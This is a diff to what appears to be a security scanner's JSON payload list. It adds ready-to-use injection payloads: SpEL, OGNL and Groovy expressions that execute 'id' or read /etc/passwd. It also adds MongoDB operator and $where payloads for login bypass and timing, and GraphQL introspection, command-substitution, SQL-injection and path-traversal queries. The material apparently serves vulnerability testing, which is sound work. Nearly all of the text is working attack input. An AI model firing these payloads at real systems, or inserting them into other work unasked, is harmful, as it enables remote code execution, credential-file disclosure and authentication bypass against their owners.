@@ -181,6 +181,22 @@
                 "expression": [
                     "javax.script.ScriptEngineManager m = new javax.script.ScriptEngineManager(); m.getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('id')\");",
                     "new javax.script.ScriptEngineManager().getEngineByName(\"nashorn\").eval(\"java.lang.Runtime.getRuntime().exec('cat /etc/passwd')\");"
+                ],
+                "spel": [
+                    "T(java.lang.Runtime).getRuntime().exec(\"id\")",
+                    "new java.lang.ProcessBuilder(new String[]{\"bash\",\"-c\",\"id\"}).start()",
+                    "T(java.lang.Runtime).getRuntime().exec(new String[]{\"bash\",\"-c\",\"cat /etc/passwd\"})"
+                ],
+                "ognl": [
+                    "(#rt=@java.lang.Runtime@getRuntime()).exec(\"id\")",
+                    "%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec(\"id\"))}",
+                    "(#cmd=\"id\").(#p=new java.lang.ProcessBuilder(#cmd)).(#p.start())"
+                ],
+                "groovy": [
+                    "\"id\".execute()",
+                    "[\"bash\",\"-c\",\"id\"].execute()",
+                    "Runtime.getRuntime().exec(\"id\")",
+                    "this.class.classLoader.parseClass(\"Runtime.getRuntime().exec('id')\").newInstance()"
                 ]
             },
             "dotnet": {
@@ -449,6 +465,50 @@
                 "${jndi:dns://{oob}/a}",
                 "${jndi:rmi://{oob}/a}"
             ]
+        },
+        "nosql_injection": {
+            "mongodb": {
+                "operator_injection": [
+                    "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
+                    "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
+                    "{\"username\": \"admin\", \"password\": {\"$regex\": \"^.*\"}}",
+                    "username[$ne]=admin&password[$ne]=x",
+                    "{\"$or\": [{}, {\"x\": \"y\"}], \"username\": \"admin\"}"
+                ],
+                "where_js": [
+                    "{\"$where\": \"return true\"}",
+                    "{\"$where\": \"this.password == this.username\"}",
+                    "{\"$where\": \"sleep(5000)\"}",
+                    "admin' || '1'=='1",
+                    "'; return true; var x='"
+                ],
+                "server_side_js": [
+                    "{\"$expr\": {\"$function\": {\"body\": \"function(){return true}\", \"args\": [], \"lang\": \"js\"}}}",
+                    "{\"$expr\": {\"$function\": {\"body\": \"function(){return sleep(5000)}\", \"args\": [], \"lang\": \"js\"}}}",
+                    "{\"$accumulator\": {\"init\": \"function(){return sleep(5000)}\", \"accumulate\": \"function(){}\", \"accumulateArgs\": [], \"merge\": \"function(){}\", \"lang\": \"js\"}}"
+                ]
+            }
+        },
+        "graphql_injection": {
+            "graphql": {
+                "introspection": [
+                    "{__schema{types{name}}}",
+                    "{__schema{queryType{name} mutationType{name} types{name fields{name}}}}",
+                    "{__type(name:\"User\"){name fields{name type{name kind}}}}",
+                    "query{__typename}"
+                ],
+                "injection": [
+                    "{ user(id: \"1; id\") { name } }",
+                    "{ user(id: \"1' OR '1'='1-- \") { name } }",
+                    "{ search(q: \"$(id)\") { id } }",
+                    "{ file(path: \"../../../../etc/passwd\") { content } }",
+                    "{ user(id: \"1${IFS}||${IFS}id\") { name } }"
+                ],
+                "batching": [
+                    "{ a: user(id:\"1\"){name} b: user(id:\"2\"){name} c: user(id:\"3\"){name} }",
+                    "query { a { b { c { d { e } } } } }"
+                ]
+            }
         }
     },
     "detection_payloads": {
